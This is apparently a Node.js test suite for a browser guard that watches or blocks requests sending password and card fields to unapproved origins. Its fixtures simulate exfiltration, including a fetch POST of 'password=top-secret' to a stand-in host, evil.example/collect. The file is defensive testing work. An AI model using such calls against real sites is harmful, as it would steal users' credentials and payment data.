"use strict";
const test = require("node:test");
const assert = require("node:assert");
const dataGuard = require("../runtime/data-exfiltration-guard");

test("monitor records protected egress without retaining values", function () {
  const guard = dataGuard.createGuard({ mode: "monitor", pageOrigin: "https://shop.example", allowedOrigins: ["https://api.shop.example"] });
  const result = guard.inspect({ transport: "fetch", method: "POST", url: "https://evil.example/collect", protectedFieldNames: ["cardNumber"], protectedValueCount: 1 });
  assert.equal(result.acted, true); assert.equal(result.blocked, false);
  assert.equal(guard.events()[0].destinationOrigin, "https://evil.example");
  assert.equal(JSON.stringify(guard.snapshot()).includes("4111111111111111"), false);
});

test("block allows approved destinations and blocks unapproved ones", function () {
  const guard = dataGuard.createGuard({ mode: "block", pageOrigin: "https://shop.example", allowedOrigins: ["https://payments.example"] });
  assert.equal(guard.inspect({ url: "https://payments.example/token", protectedFieldNames: ["cc"] }).blocked, false);
  assert.equal(guard.inspect({ url: "https://collector.example/x", protectedFieldNames: ["cc"] }).blocked, true);
  assert.equal(guard.events().length, 1);
});

test("same-origin is allowed by default and can be disabled", function () {
  assert.equal(dataGuard.createGuard({ mode: "block", pageOrigin: "https://shop.example" }).inspect({ url: "/checkout", protectedFieldNames: ["password"] }).blocked, false);
  assert.equal(dataGuard.createGuard({ mode: "block", pageOrigin: "https://shop.example", allowSameOrigin: false }).inspect({ url: "/checkout", protectedFieldNames: ["password"] }).blocked, true);
});

test("traffic without protected data is not acted on", function () {
  const guard = dataGuard.createGuard({ mode: "block", pageOrigin: "https://shop.example" });
  assert.equal(guard.inspect({ url: "https://evil.example/pixel" }).acted, false);
});

test("browser fetch hook blocks protected field egress", async function () {
  const password = { name: "password", value: "top-secret", id: "", form: null }; let originalCalls = 0;
  const win = { location: { origin: "https://shop.example", href: "https://shop.example/login" }, document: { querySelectorAll: (selector) => selector === "input[type=password]" ? [password] : [] }, fetch: () => { originalCalls++; return Promise.resolve({ status: 200 }); }, Response: function (body, init) { this.body = body; this.status = init.status; }, navigator: {} };
  const guard = dataGuard.attach(win, { mode: "block" });
  const response = await win.fetch("https://evil.example/collect", { method: "POST", body: "password=top-secret" });
  assert.equal(response.status, 451); assert.equal(originalCalls, 0);
  assert.deepEqual(guard.events()[0].protectedFieldNames, ["password"]);
  assert.equal(JSON.stringify(guard.snapshot()).includes("top-secret"), false);
});

test("browser hook is idempotent and detach restores fetch", function () {
  const original = () => Promise.resolve({ status: 200 });
  const win = { location: { origin: "https://shop.example" }, document: { querySelectorAll: () => [] }, fetch: original, navigator: {} };
  const first = dataGuard.attach(win, {}); assert.strictEqual(dataGuard.attach(win, {}), first);
  first.detach(); assert.equal(typeof win.fetch, "function");
});
